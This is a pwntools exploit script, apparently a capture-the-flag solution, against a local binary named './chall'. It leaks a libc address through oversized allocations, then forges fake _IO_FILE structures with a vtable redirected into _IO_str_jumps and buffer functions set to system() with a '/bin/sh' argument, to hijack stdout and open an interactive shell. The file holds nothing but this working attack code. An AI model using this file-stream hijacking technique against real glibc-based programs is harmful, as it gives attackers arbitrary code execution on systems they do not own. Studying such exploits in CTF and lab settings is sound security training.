from pwn import *

p = process('./chall')
context.log_level = 'error'

def send(b,a=':'):
    p.sendlineafter(a,str(b),timeout=1) 
    
def create(alloc_size, write_size, data):
    send(1,'>')
    send(alloc_size)
    send(write_size)
    send(data)
    
#gdb.attach(p)


create(0x200000, 0x5ed761,'a')

create(0x200000, 0x5ed761+0x201010,'b')

t = p.readuntil(' / ')

print t.encode('hex')

leak = u64(t[9:17])
print hex(leak)

libc = ELF('./libc.so.6')
libc.address= leak - 0x3ed8b0

stdout = libc.symbols['_IO_2_1_stdout_']
stdin = libc.symbols['_IO_2_1_stdout_']
wide_data = libc.address + 0x3eb8c0#libc.sym["_IO_wide_data_1"]
stdfile_lock = libc.address + 0x3ed8c0#libc.sym["__realloc_hook"] #just needs to be writeable
#io_str_jumps = libc.symbols["_IO_str_jumps"]
io_str_jumps = libc.address + 0x3e8360
#io_str_jumps = libc.address + 0x3e7e20-8*13
system = libc.sym['system']

io_jump_file = libc.sym['_IO_file_jumps']

bin_sh = next(libc.search("/bin/sh"))

fake  = p64(0xfbad1800) # original _flags & ~_IO_USER_BUF
fake += p64(0) * 6 # _IO_read_ptr to _IO_write_base
fake += p64(bin_sh) # _IO_write_end and _IO_buf_base
fake += p64(0) * 9 # _IO_save_base to _markers
fake += p64(stdfile_lock) # _lock
fake += p64(0)*9 # _codecvt
fake += p64(io_str_jumps-0x28) # vtable
fake += p64(system)*2 # _s._allocate_buffer

create(0x200000, 0x9eea29,fake)

p.send(p64(0xfbad208b) + p64(stdout+0xd8) + p64(0)*5 + p64(stdout) + p64(stdin+0x2000) + p64(0)*7 + '\x00'*4 )



fake  = p64(0xfbad1800) # original _flags & ~_IO_USER_BUF
fake += p64(0) * 4 # _IO_read_ptr to _IO_write_base
fake += p64((bin_sh - 100) // 2) # _IO_write_ptr
fake += p64(0) * 2 # _IO_write_end and _IO_buf_base
fake += p64((bin_sh - 100) // 2) # _IO_buf_end
fake += p64(0) * 8 # _IO_save_base to _markers
fake += p64(stdfile_lock) # _lock
fake += p64(0)*9 # _freeres_list
fake += p64(io_str_jumps-0x20) # vtable
fake += p64(system) # _s._allocate_buffer
fake += p64(stdout) # _s._free_buffer


#gdb.attach(p)
p.sendline(fake)

#p.sendline(p64(libc.address-0x603000+0x10))



p.interactive()
